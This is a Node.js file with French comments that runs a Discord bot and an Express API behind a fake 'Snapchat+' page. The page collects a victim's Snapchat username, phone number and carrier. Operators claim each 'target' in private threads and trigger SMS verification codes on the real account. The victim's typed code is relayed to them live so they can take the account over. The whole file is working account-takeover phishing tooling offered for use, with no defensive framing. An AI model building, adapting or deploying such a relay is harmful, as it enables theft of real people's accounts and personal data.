const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245';

const demandes = new Map();

const client = new Client({ intents: [
  GatewayIntentBits.Guilds,
  GatewayIntentBits.GuildMessages,
  GatewayIntentBits.MessageContent,
  GatewayIntentBits.GuildMembers
]});

client.once('ready', () => {
  console.log(`✅ Bot connecté : ${client.user.tag}`);
  client.user.setActivity('Snapchat+ | Halloween', { type: 'WATCHING' });
});

/* ═══════════════════════════════════════════════════════════════
   GESTION DES BOUTONS
   ═══════════════════════════════════════════════════════════════ */
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;

  const args = interaction.customId.split(':');
  const action = args[0];
  const demandeId = args[1];
  const demande = demandes.get(demandeId);

  if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });

  // ── 1. PRENDRE LE NUMÉRO ──
  if (action === 'claim') {
    if (demande.claimed) return interaction.reply({ content: '❌ Trop tard, ce numéro a déjà été pris !', ephemeral: true });

    demande.claimed = true;
    demande.claimedBy = interaction.user.id;
    demandes.set(demandeId, demande);

    await interaction.update({
      content: `⚡ **Nouveau numéro disponible : ${demande.operator}**\n✅ *Ce numéro a été pris par ${interaction.user}*`,
      embeds: [],
      components: []
    });

    const thread = await interaction.channel.threads.create({
      name: `📁 Dossier - @${demande.username}`,
      type: ChannelType.PrivateThread,
      reason: 'Prise en charge du dossier client'
    });
    
    await thread.members.add(interaction.user.id);
    demande.threadId = thread.id;
    demandes.set(demandeId, demande);

    const dossierEmbed = new EmbedBuilder()
      .setTitle('📁 FICHE DE VÉRIFICATION')
      .setColor(0xFF6B00)
      .setDescription(`Nouveau numéro attribué pour **@${demande.username}**.\nEnvoyez le code SMS à la cible, puis cliquez sur l'option ci-dessous :`)
      .addFields(
        { name: '📱 Numéro Cible', value: `**+33 ${demande.phone}**\n\`${demande.phone}\``, inline: false },
        { name: '👤 Snapchat', value: `\`@${demande.username}\``, inline: true },
        { name: '🏢 Opérateur', value: `\`${demande.operator}\``, inline: true },
        { name: '📟 Appareil', value: '`Windows PC`', inline: true },
        { name: '🌍 Pays', value: '🇫🇷 France', inline: true }
      )
      .setFooter({ text: 'Sélectionnez la longueur du code à demander' });

    const rowCode = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`setcode:4:${demandeId}`).setLabel('Code 4 Chiffres').setStyle(ButtonStyle.Success).setEmoji('📱'),
      new ButtonBuilder().setCustomId(`setcode:6:${demandeId}`).setLabel('Code 6 Chiffres').setStyle(ButtonStyle.Primary).setEmoji('🔢')
    );
    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`copynum:${demandeId}`).setLabel('Copier Numéro').setStyle(ButtonStyle.Secondary).setEmoji('📋'),
      new ButtonBuilder().setCustomId(`blacklist:${demandeId}`).setLabel('Blacklist').setStyle(ButtonStyle.Danger).setEmoji('🚫'),
      new ButtonBuilder().setCustomId(`reject:${demandeId}`).setLabel('Rejeter').setStyle(ButtonStyle.Danger).setEmoji('❌')
    );

    await thread.send({ content: `${interaction.user}, voici ton dossier :`, embeds: [dossierEmbed], components: [rowCode, rowActions] });
    return interaction.followUp({ content: `✅ Dossier déplacé dans ton fil privé : ${thread}`, ephemeral: true });
  }

  // ── 2. COPIER LE NUMÉRO ──
  if (action === 'copynum') {
    return interaction.reply({ content: `${demande.phone.replace(/\s/g, '')}`, ephemeral: true });
  }

  // ── 3. DEMANDER LE CODE (4 ou 6) ──
  if (action === 'setcode') {
    const length = parseInt(args[1]);
    const demId = args[2]; // On récupère l'ID correctement ici
    const dem = demandes.get(demId);
    
    dem.codeLength = length;
    dem.waitingForCode = true;
    demandes.set(demId, dem);

    await interaction.update({
      content: `⏳ **Demande envoyée au client (Code à ${length} chiffres). En attente de sa saisie...**`,
      embeds: [],
      components: []
    });
  }

  // ── 4. MAUVAIS CODE ──
  if (action === 'badcode') {
    demande.waitingForCode = true;
    demandes.set(demandeId, demande);
    await interaction.update({
      content: `⚠️ **Code signalé invalide. Le client est invité à retaper son code sur la page.**`,
      embeds: [],
      components: []
    });
  }

  // ── 5. VALIDER ──
  if (action === 'accept') {
    demande.status = 'accepted';
    demandes.set(demandeId, demande);
    await interaction.update({ content: `✅ **Dossier approuvé avec succès.**\n*(Ce fil sera supprimé dans 5 secondes...)*`, embeds: [], components: [] });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }
  
  // ── 6. REJETER / BLACKLIST ──
  if (action === 'reject' || action === 'blacklist') {
    demande.status = action === 'reject' ? 'rejected' : 'blacklisted';
    demandes.set(demandeId, demande);
    await interaction.update({ content: `❌ **Dossier rejeté.**\n*(Ce fil sera supprimé dans 5 secondes...)*`, embeds: [], components: [] });
    setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
  }
});

/* ═══════════════════════════════════════════════════════════════
   API EXPRESS
   ═══════════════════════════════════════════════════════════════ */
const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/demande', async (req, res) => {
  try {
    const { username, phone, operator } = req.body;
    const id = uuidv4();
    let formattedPhone = phone;
    if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;

    const demande = { id, username, phone: formattedPhone, operator, status: 'pending', claimed: false, waitingForCode: false };
    demandes.set(id, demande);

    const channel = await client.channels.fetch(ADMIN_CHANNEL_ID);
    
    const embedPublic = new EmbedBuilder()
      .setTitle(`⚡ NOUVEAU NUMÉRO DISPONIBLE : ${operator}`)
      .setColor(0xFF6B00)
      .setDescription('Un utilisateur attend sa validation sur le site.\nCliquez sur **Prendre le numéro** pour traiter le dossier.')
      .addFields(
        { name: '🌍 Pays', value: '🇫🇷 France', inline: true },
        { name: '📟 Appareil', value: '💻 Windows PC', inline: true },
        { name: '🏢 Opérateur', value: `\`${operator}\``, inline: true }
      )
      .setFooter({ text: 'SnapPlus • Numéro masqué' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`claim:${id}`).setLabel('Prendre le numéro').setStyle(ButtonStyle.Primary).setEmoji('⚡')
    );

    const msg = await channel.send({ content: `@everyone ⚡ **NOUVELLE COMMANDE : ${operator}**`, embeds: [embedPublic], components: [row] });
    demande.publicMsgId = msg.id;
    demandes.set(id, demande);

    res.json({ success: true, demandeId: id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/demande/:id/status', (req, res) => {
  const demande = demandes.get(req.params.id);
  if (!demande) return res.status(404).json({ error: 'Introuvable' });
  if (demande.status === 'blacklisted') return res.json({ status: 'rejected', blacklisted: true });
  res.json({ status: demande.status, waitingForCode: demande.waitingForCode });
});

app.post('/api/demande/:id/code', async (req, res) => {
  try {
    const { code } = req.body;
    const demande = demandes.get(req.params.id);
    if (!demande) return res.status(404).json({ error: 'Introuvable' });

    demande.waitingForCode = false;
    demande.code = code;
    demandes.set(demande.id, demande);

    const embedCode = new EmbedBuilder()
      .setTitle('🔑 CODE REÇU DU CLIENT')
      .setColor(0x2b2d31)
      .setDescription(`Le client **@${demande.username}** vient de saisir son code :`)
      .addFields(
        { name: '➡️ Code', value: `# **${code}**`, inline: false },
        { name: '📱 Numéro', value: `**+33 ${demande.phone}**`, inline: true },
        { name: '👤 Compte Snap', value: `\`@${demande.username}\``, inline: true }
      )
      .setTimestamp();

    const rowActions = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`accept:${demande.id}`).setLabel('Valider & Activer').setStyle(ButtonStyle.Success).setEmoji('✅'),
      new ButtonBuilder().setCustomId(`badcode:${demande.id}`).setLabel('Mauvais Code').setStyle(ButtonStyle.Danger).setEmoji('⚠️')
    );

    if (demande.threadId) {
      const thread = await client.channels.fetch(demande.threadId).catch(() => null);
      if (thread) {
        await thread.send({ content: `<@${demande.claimedBy}> 🚨 **ALERTE CODE REÇU — ACTION IMMÉDIATE : ${code}** 🚨`, embeds: [embedCode], components: [rowActions] });
      }
    }

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 API sur port ${PORT}`));

client.login(DISCORD_TOKEN);